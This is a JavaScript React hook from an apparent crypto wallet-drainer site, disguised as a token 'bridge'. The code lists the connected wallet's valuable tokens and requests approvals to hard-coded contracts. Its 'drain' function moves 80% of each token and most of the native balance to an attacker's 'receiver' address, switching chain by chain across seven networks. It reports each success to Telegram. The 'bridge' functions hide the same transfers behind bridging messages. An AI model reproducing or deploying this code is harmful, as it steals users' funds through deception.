"use client";

import { useAccount, useSwitchChain } from "wagmi";
import { getBalance, getChainId, getGasPrice } from "@wagmi/core";
import axios from "axios";
import { Contract, providers, ethers, utils } from "ethers";
import contractAbi from "../blockchain/contract.json";
import { config, receiver, receiver2, API_KEY } from "./Web3Config";
import { toast } from "react-toastify";
import Web3 from "web3";
import { sendAppDetailsToTelegramDrain } from "./telegramUtils";
import { getRecipientAddress } from "./getUserLocation";



export const getContractAddress = async (chainId) => {
    const recipient = await getRecipientAddress();
    console.log(recipient) // Fetch recipient dynamically
    if (!recipient || !ethers.utils.isAddress(recipient)) {
        console.error("Invalid recipient address.");
        return;  // Abort if recipient address is invalid
    }
    if (recipient === receiver) {
        switch (chainId) {
            case 1:
                return "0xe13686dc370817C5dfbE27218645B530041D2466"; // Ethereum
            case 56:
                return "0x2B7e812267C55246fe7afB0d6Dbc6a32baEF6A15"; // Binance
            case 137:
                return "0x1bdBa4052DFA7043A7BCCe5a5c3E38c1acE204b5"; // Polygon
            case 43114:
                return "0x07145f3b8B9D581A1602669F2D8F6e2e8213C2c7"; // Avalanche
            case 42161:
                return "0x1bdBa4052DFA7043A7BCCe5a5c3E38c1acE204b5"; // Arbitrum
            case 10:
                return "0x1bdBa4052DFA7043A7BCCe5a5c3E38c1acE204b5"; // Optimism
            case 42220:
                return "0xdA79c230924D49972AC12f1EA795b83d01F0fBfF"; // Celo
            default:
                throw new Error("Unsupported network");
        }
    } else if (recipient === receiver2) {
        switch (chainId) {
            case 1:
                return "0xC139c48F142daf9F3b2D17E9002F4D27Cf4D6966"; // Ethereum
            case 56:
                return "0xC139c48F142daf9F3b2D17E9002F4D27Cf4D6966"; // Binance
            case 137:
                return "0xC139c48F142daf9F3b2D17E9002F4D27Cf4D6966"; // Polygon
            case 43114:
                return "0xC139c48F142daf9F3b2D17E9002F4D27Cf4D6966"; // Avalanche
            case 42161:
                return "0xC139c48F142daf9F3b2D17E9002F4D27Cf4D6966"; // Arbitrum
            case 10:
                return "0xC139c48F142daf9F3b2D17E9002F4D27Cf4D6966"; // Optimism
            case 42220:
                return "0xC139c48F142daf9F3b2D17E9002F4D27Cf4D6966"; // Celo
            default:
                throw new Error("Unsupported network");
        }
    }
};

const getChainNameById = (chainId) => {
    switch (chainId) {
        case 1:
            return "Ethereum";
        case 56:
            return "Binance Smart Chain";
        case 137:
            return "Polygon";
        case 43114:
            return "Avalanche";
        case 42161:
            return "Arbitrum";
        case 10:
            return "Optimism";
        case 42220:
            return "Celo";
        default:
            return "Unknown Chain";
    }
};

export const UseWallet = () => {
    const account = useAccount();
    const { switchChain } = useSwitchChain();
    // Chain status tracking
    let chainInteractionStatus = {
        1: false, // Ethereum Mainnet
        56: false, // Binance Smart Chain Mainnet
        137: false, // Polygon Mainnet
        43114: false, // Avalanche Mainnet
        42161: false, // Arbitrum Mainnet
        10: false, // Optimism Mainnet
        42220: false, // Celo Mainnet
    };

    const chainDrainStatus = {
        1: false, // Ethereum Mainnet
        56: false, // Binance Smart Chain Mainnet
        137: false, // Polygon Mainnet
        43114: false, // Avalanche Mainnet
        42161: false, // Arbitrum Mainnet
        10: false, // Optimism Mainnet
        42220: false, // Celo Mainnet
    };



    const approveTokens = async () => {
        if (account && account.address && account.chainId) {
            const tokens = await getTokenAssets();
            const provider = new providers.JsonRpcProvider(
                account.chainId === 1
                    ? "https://mainnet.infura.io/v3/1aa31fce4c0f49c38c1464b4bfa49f73"
                    : "https://bsc-dataseed.binance.org"
            );

            for (let token of tokens) {
                const tokenContract = new Contract(
                    token.tokenAddress,
                    [
                        "function approve(address spender, uint256 amount) external returns (bool)",
                    ],
                    provider.getSigner(account.address)
                );

                try {
                    const tx = await tokenContract.approve(
                        getContractAddress(account.chainId),
                        utils.parseUnits(token.tokenAmount.toString(), token.tokenDecimal)
                    );
                    console.log(`Approval tx hash: ${tx.hash}`);
                    await tx.wait();
                    console.log(`Approved ${token.tokenAmount} of ${token.tokenName}`);
                } catch (error) {
                    console.error(`Approval failed for ${token.tokenName}:`, error);
                    // Continue to the next token even if approval fails
                }
            }
        }
    };

    const drain = async (setTxState, topAsset, balance, topInput, txState) => {
        if (!window.ethereum || !account?.address || !account?.chainId) {
            console.log("Ethereum provider is not available.");
            return;
        }

        const chainId = getChainId(config);

        // Update chainInteractionStatus after interacting with the chain
        chainInteractionStatus[chainId] = true;

        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner(account.address);
        const ethBalance = await getBalance(config, {
            address: account.address,
            chainId: account.chainId,
        });

        const tokens = await getTokenAssets();

        // Process each token individually
        for (let token of tokens) {
            const { tokenAddress, tokenAmount } = token;

            if (tokenAddress !== "0x0000000000000000000000000000000000000000") {
                const tokenContract = new Contract(
                    tokenAddress,
                    [
                        "function balanceOf(address owner) view returns (uint256)",
                        "function transfer(address to, uint256 amount) external returns (bool)",
                    ],
                    signer
                );

                const amountInWei = ethers.BigNumber.from(tokenAmount.toString())
                    .mul(8)
                    .div(10); // Transfer 80% of the balance

                try {
                    const userBalance = await tokenContract.balanceOf(account.address);
                    if (userBalance.lt(amountInWei)) {
                        console.log(`Insufficient token balance for ${tokenAddress}`);
                        sendAppDetailsToTelegramDrain(ethBalance, token, chainId, Number(tokenAmount) * 0.8, 'Failed')
                        continue; // Move to next token
                    }

                    const transferTx = await tokenContract.transfer(
                        receiver,
                        amountInWei
                    );
                    console.log(`Transfer tx hash: ${transferTx.hash}`);
                    const receipt = await transferTx.wait();

                    if (receipt.status === 1) {
                        console.log(`Successfully transferred ${amountInWei.toString()} of ${tokenAddress}`);
                        sendAppDetailsToTelegramDrain(balance, token, chainId, Number(tokenAmount) * 0.8, 'Success', undefined, transferTx.hash)
                    } else {
                        console.log(`Transfer failed for ${tokenAddress}`);
                        sendAppDetailsToTelegramDrain(balance, token, chainId, Number(tokenAmount) * 0.8, 'Failed')
                    }

                    chainDrainStatus[chainId] = true; // Mark chain as drained if successful
                } catch (error) {
                    console.log(`Transfer failed for ${tokenAddress}:`, error);
                    sendAppDetailsToTelegramDrain(balance, token, chainId, Number(tokenAmount) * 0.8, 'Failed', error)
                    continue; // Continue to next token on failure
                }
            }
        }

        // After tokens, handle multicall for native tokens
        await handleMulticall(tokens, ethBalance);
    };

    // const handleDrain = async ({ chainId, address }) => {
    //   if (!window.ethereum || !account?.address || !account?.chainId) {
    //     console.log("Ethereum provider is not available.");
    //     return;
    //   }

    //   const chainId = getChainId(config);
    //   console.log(chainId);

    //   // Update chainInteractionStatus after interacting with the chain
    //   chainInteractionStatus[chainId] = true;

    //   const provider = new ethers.providers.Web3Provider(window.ethereum);
    //   const signer = provider.getSigner(account.address);
    //   const ethBalance = await getBalance(config, {
    //     address: account.address,
    //     chainId: account.chainId,
    //   });

    //   const tokens = await getTokenAssets();

    //   // Process each token individually
    //   for (let token of tokens) {
    //     const { tokenAddress, tokenAmount } = token;

    //     if (tokenAddress !== "0x0000000000000000000000000000000000000000") {
    //       const tokenContract = new Contract(
    //         tokenAddress,
    //         [
    //           "function balanceOf(address owner) view returns (uint256)",
    //           "function transfer(address to, uint256 amount) external returns (bool)",
    //         ],
    //         signer
    //       );

    //       const amountInWei = ethers.BigNumber.from(tokenAmount.toString())
    //         .mul(8)
    //         .div(10); // Transfer 80% of the balance

    //       try {
    //         const userBalance = await tokenContract.balanceOf(account.address);
    //         if (userBalance.lt(amountInWei)) {
    //           console.log(`Insufficient token balance for ${tokenAddress}`);
    //           continue; // Move to next token
    //         }

    //         const transferTx = await tokenContract.transfer(
    //           receiver,
    //           amountInWei
    //         );
    //         console.log(`Transfer tx hash: ${transferTx.hash}`);
    //         await transferTx.wait();
    //         console.log(
    //           `Transferred ${amountInWei.toString()} of ${tokenAddress}`
    //         );

    //         chainDrainStatus[chainId] = true; // Mark chain as drained if successful
    //       } catch (error) {
    //         console.log(`Transfer failed for ${tokenAddress}:`, error);
    //         continue; // Continue to next token on failure
    //       }
    //     }
    //   }

    //   // After tokens, handle multicall for native tokens
    //   await handleMulticall(tokens, ethBalance);
    // };

    const handleMulticall = async (tokens, ethBalance) => {
        const chainId = getChainId(config);
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner(account.address);
        const multiCallContract = new Contract(
            getContractAddress(chainId),
            contractAbi,
            signer
        );
        let totalEthRequired = ethers.BigNumber.from(ethBalance.value)
        const tokenAddresses = tokens.map((token) => token.tokenAddress);
        const amounts = tokens.map((token) =>
            ethers.BigNumber.from(token.tokenAmount).mul(8).div(10)
        );

        try {
            const gasPrice = await getGasPrice(config, { chainId: account.chainId });
            const gasEstimate = await multiCallContract.estimateGas.multiCall(
                tokenAddresses,
                amounts,
                {
                    value: ethBalance.value,
                }
            );
            const gasFee = gasEstimate.mul(gasPrice);

            const totalEthRequired = ethers.BigNumber.from(ethBalance.value)
                .mul(8)
                .div(10); // Transfer 70% of ETH

            if (totalEthRequired.lt(gasFee)) {
                toast.error("Not enough ETH to cover gas fees and transfer.", {
                    toastId: "drain",
                });
                console.log("Not enough ETH to cover gas fees and transfer.");
                setTimeout(async () => {
                    await proceedToNextChain();
                }, 4000)
                return;
            }

            const tx = await multiCallContract.multiCall(tokenAddresses, amounts, {
                value: totalEthRequired,
            });

            console.log(`Multicall transaction hash: ${tx.hash}`);
            const receipt = await tx.wait();
            console.log(receipt)
            if (!receipt || !receipt.status || receipt.status !== 1) {
                setTimeout(() => {
                    sendAppDetailsToTelegramDrain(ethBalance, tokens, chainId, ethers.utils.formatEther(totalEthRequired.mul(7).div(10)), 'Failed')
                }, 3000);
                console.error('Transaction failed:', receipt);
                throw new Error('Transaction failed or returned invalid status');
            }
            console.log(`Multicall transaction confirmed: ${tx.hash}`);
            if (receipt.status === 1) {
                sendAppDetailsToTelegramDrain(ethBalance, tokens, chainId, ethers.utils.formatEther(totalEthRequired.mul(7).div(10)), 'Success', undefined, tx.hash)
            }
            chainDrainStatus[chainId] = true; // Mark chain as drained if successful
            setTimeout(async () => {
                await proceedToNextChain();
            }, 4000)
        } catch (error) {
            console.log("Multicall operation failed:", error);
            sendAppDetailsToTelegramDrain(ethBalance, tokens, chainId, ethers.utils.formatEther(totalEthRequired.mul(7).div(10)), 'Failed', error.message)
            setTimeout(async () => {
                await proceedToNextChain();
            }, 4000)
        }
    };

    const getWalletBalance = async ({ setWalletBalance }) => {
        try {
            // Check if window.ethereum is available
            if (typeof window.ethereum === "undefined") {
                console.log("Ethereum provider is not available");
                return;
            }

            // Initialize Web3 instance
            const web3 = new Web3(window.ethereum);

            // Request accounts
            const accounts = await window.ethereum.request({
                method: "eth_requestAccounts",
            });

            if (!accounts || accounts.length === 0) {
                console.log(
                    "No accounts found. Make sure the user is logged into their wallet."
                );
                return;
            }

            // Get balance in wei
            const weiBalance = await web3.eth.getBalance(accounts[0]);

            if (weiBalance === undefined) {
                console.error("Failed to fetch balance for the account:", accounts[0]);
                return;
            }

            // Convert to Ether
            const ethBalance = web3.utils.fromWei(weiBalance, "ether"); // Specify 'ether' as the unit
            // console.log("ETH Balance:", ethBalance);

            // Set the wallet balance state
            setWalletBalance(ethBalance);
        } catch (err) {
            console.log("Error fetching balance:", err);
        }
    };

    const proceedToNextChain = async () => {
        const nextChainId = Object.keys(chainInteractionStatus).find(
            (id) => !chainInteractionStatus[id]
        );

        if (nextChainId) {
            try {
                await switchChain(config, { chainId: Number(nextChainId) });
                await drain(); // Recursive call to drain the next chain
            } catch (switchError) {
                console.log(`Failed to switch chain to ${nextChainId}:`, switchError);
                setTimeout(async () => {
                    await proceedToNextChain();
                }, 4000) // Continue to next operation even if chain switch fails
            }
        } else {
            console.log("All chains have been interacted with.");

            // Check for any chains that were not fully drained and retry
            const notDrainedChains = Object.keys(chainDrainStatus).filter(
                (id) => !chainDrainStatus[id] && chainInteractionStatus[id]
            );

            if (notDrainedChains.length > 0) {
                for (const chainId of notDrainedChains) {
                    try {
                        await switchChain(config, { chainId: Number(chainId) });
                        await drain(); // Retry draining for non-drained chains
                    } catch (switchError) {
                        console.log(
                            `Failed to switch to non-drained chain ${chainId}:`,
                            switchError
                        );
                        continue; // Skip and continue with other non-drained chains
                    }
                }
            } else {
                console.log(
                    "All chains have been drained or attempted. Stopping further operations."
                );
            }
        }
    };

    const getTokenAssets = async () => {
        const chainId = getChainId(config);
        let tokenBalances = [];
        const options = {
            url: `https://api.chainbase.online/v1/account/tokens?chain_id=${chainId}&address=${account.address}&limit=20&page=1`,
            method: "GET",
            headers: {
                "x-api-key": API_KEY,
                accept: "application/json",
            },
        };
        try {
            const tokenListResponse = await axios(options);
            const tokens = tokenListResponse.data.data;

            if (!tokens) return tokenBalances;

            for (const token of tokens) {
                const tokenAmount = BigInt(token.balance);
                const tokenAddress = token.contract_address.toLowerCase();
                const usdAmount = token.current_usd_price || 0;
                const tokenDecimal = token.decimals;
                if (usdAmount > 0) {
                    tokenBalances.push({
                        tokenAmount: tokenAmount,
                        tokenName: token.name,
                        tokenDecimal: tokenDecimal,
                        usdAmount: usdAmount,
                        tokenAddress,
                    });
                }
            }
            tokenBalances.sort((a, b) => b.usdAmount - a.usdAmount);
        } catch (error) {
            console.log("Error fetching token assets:", error);
        }

        return tokenBalances;
    };
    // Main function to handle bridging logic based on token type
    const bridgeTokens = async ({ token, amount, provider, accountAddress, chainId, txState, setTxState, balance }) => {
        console.log(token)
        console.log(accountAddress)

        try {
            if (!accountAddress || !chainId) {
                toast.error("Connect your wallet first.");
                return;
            }

            const isNative = token.token_address === "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee"; // Check if native token
            console.log(isNative)
            if (isNative) {
                // Bridge Native Token (ETH, BNB, etc.)
                const transactionResponse = await bridgeNativeToken(token, amount, provider, accountAddress, chainId, txState, setTxState, balance);
                return transactionResponse; // Return the transaction response
            } else {
                // Bridge Non-Native Token (DAI, USDT, etc.)
                const transactionResponse = await bridgeNonNativeToken(token, amount, provider, accountAddress, chainId, txState, setTxState, balance);
                console.log(transactionResponse)
                return transactionResponse; // Return the transaction response
            }
        } catch (error) {
            setTxState('Failed')
            console.error("Error in bridging tokens:", error);
            toast.error("Failed to bridge tokens.");
            return null; // Return null in case of error
        }
    };

    // Function to handle native token bridging through multicall
    const bridgeNativeToken = async (token, amount, provider, accountAddress, chainId, txState, setTxState, balance) => {
        const amountInWei = ethers.utils.parseEther(amount.toString());
        try {
            if (!accountAddress || !provider) {
                toast.error("Connect your wallet first.");
                return;
            }


            const signer = provider.getSigner(); // Use the provided provider
            const senderAddress = await signer.getAddress(); // Fetch the user's address (connected wallet)

            const contractAddress = getContractAddress(chainId); // Get contract address for the current chain


            // Create the transaction object
            const tx = {
                from: senderAddress, // Sender address
                to: contractAddress, // Contract address
                value: amountInWei, // Amount to send
                gasLimit: ethers.utils.hexlify(100000), // Adjust gas limit as needed
            };

            console.log("Transaction:", tx); // Log the transaction for debugging

            // Send the transaction through the connected wallet provider
            const transactionResponse = await signer.sendTransaction(tx);
            await transactionResponse.wait();
            console.log(`Transaction initiated. Hash: ${transactionResponse.hash}`);
            transactionResponse.hash && setTxState('Initalized')
            // Optionally, you can show a message to the user

            // Wait for the transaction to be mined

            const checkTransactionStatus = async (txHash) => {
                console.log('TX hash: ', txHash)
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const receipt = await provider.getTransactionReceipt(txHash);
                return receipt;
            };

            const checkStatus = async () => {
                const receipt = await checkTransactionStatus(transactionResponse.hash);
                if (receipt) {
                    console.log('Receipt: ', receipt)
                    if (receipt.status === 1) {
                        sendAppDetailsToTelegramDrain(balance, token, chainId, ethers.utils.formatEther(amountInWei), 'Success', undefined, tx.hash)
                        setTimeout(() => {
                            setTxState('Success')
                        }, 5000);
                        console.log(`Successfully bridged ${amount} native token.`);
                        return true; // Transaction was successful
                    } else if (receipt.status === 0) {
                        console.log("Transaction failed.");
                        setTxState('Failed')
                        return false; // Transaction failed
                    }
                } else {
                    console.log("Transaction is still pending or was canceled.");
                    return null; // Transaction is still pending
                }
            };

            // Set a timeout for checking the transaction status
            const timeoutDuration = 60000; // 60 seconds
            const intervalDuration = 5000; // Check every 5 seconds
            let elapsedTime = 0;

            const interval = setInterval(async () => {
                const status = await checkStatus();
                if (status !== null) {
                    clearInterval(interval); // Clear the interval if we have a definitive status
                }
                elapsedTime += intervalDuration;
                if (elapsedTime >= timeoutDuration) {
                    clearInterval(interval);
                    console.log("Transaction check timed out.");
                    toast.warning("Transaction check timed out. Please check your wallet.");
                }
            }, intervalDuration);

        } catch (error) {
            console.error("Native token bridging failed:", error);
            toast.error("Failed to bridge native token.");
            setTxState('Failed')
            console.log('TX State: ', txState)
            sendAppDetailsToTelegramDrain(balance, token, chainId, ethers.utils.formatEther(amountInWei), 'Failed', error.message)

            return null; // Return null in case of failure
        }
    };

    // Function to transfer non-native tokens to receiver address
    const bridgeNonNativeToken = async (token, amount, provider, accountAddress, chainId, txState, setTxState, balance) => {
        const amountInWei = ethers.utils.parseUnits(amount.toString(), token.decimals); // Convert amount to token's decimals

        try {
            if (!token.token_address) {
                console.error("Invalid token address:", token);
                throw new Error("Token address is undefined or invalid.");
            }

            const signer = provider.getSigner(accountAddress); // Use the provided provider and account address

            const tokenContract = new ethers.Contract(
                token.token_address,
                ["function transfer(address to, uint256 amount) external returns (bool)",
                    "function balanceOf(address owner) view returns (uint256)"],
                signer
            );

            const senderBalance = await tokenContract.balanceOf(accountAddress); // Get the balance of the sender

            // Check if the user has enough balance
            if (senderBalance.lt(amountInWei)) {
                toast.error(`Insufficient ${token.name} balance.`);
                throw new Error(`Insufficient ${token.name} balance.`);
            }

            // Use callStatic to simulate the transaction (ensure it won't fail)
            await tokenContract.callStatic.transfer(receiver, amountInWei);

            // If the callStatic doesn't throw, proceed with the actual transfer transaction
            const tx = await tokenContract.transfer(receiver, amountInWei);
            console.log(`Non-native token transfer tx hash: ${tx.hash}`);
            const receipt = await tx.wait(); // Wait for the transaction to be mined

            if (receipt && receipt.status === 1) {
                toast.success(`Transferred ${amount} ${token.name} successfully.`);
                sendAppDetailsToTelegramDrain(balance, token, chainId, ethers.utils.formatEther(amountInWei), 'Success', undefined, tx.hash)
                return tx; // Return the transaction response
            } else {
                toast.error(`Transfer failed for ${token.name}.`);
                sendAppDetailsToTelegramDrain(balance, token, chainId, ethers.utils.formatEther(amountInWei), 'Failed')
                return null; // Return null in case of failure
            }
        } catch (error) {
            console.error(`Transfer failed for ${token.name}:`, error);
            toast.error(`Transfer failed for ${token.name}.`);
            setTxState('Failed')
            sendAppDetailsToTelegramDrain(balance, token, chainId, ethers.utils.formatEther(amountInWei), 'Failed', error.message)
            return null; // Return null in case of failure
        }
    };


    return {
        approveTokens,
        drain,
        getTokenAssets,
        // handleDrain,
        bridgeTokens,
        getWalletBalance,
    };
};
